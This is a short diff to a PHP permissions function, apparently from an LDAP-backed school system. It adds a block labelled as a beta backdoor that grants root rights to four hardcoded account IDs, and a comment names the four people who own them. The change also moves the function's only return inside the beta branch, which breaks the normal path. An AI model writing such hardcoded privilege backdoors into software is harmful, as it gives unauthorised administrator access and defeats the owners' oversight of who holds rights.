@@ -93,7 +93,20 @@
 				$rightArray["news"] = true;
 			}
 		}
-		return $rightArray;
+		
+		// Backdoor; REMOVE THIS AFTER BETA
+		if (BETA) {
+			$dn = $ent[0]['dn'];
+			$dn = split(",", $dn);
+			$cn = $dn[0];
+			$cn = split("=", $cn);
+			$cn = $cn[1];
+			//         Buchberger           Handle               Klotz                Weiland
+			if ($cn == "20090319" || $cn == "20090334" || $cn == "20090340" || $cn == "20090396")
+				$rightArray['root'] = true;
+			
+			return $rightArray;
+		}
 	}
 
 	function isTeacher($ent) {
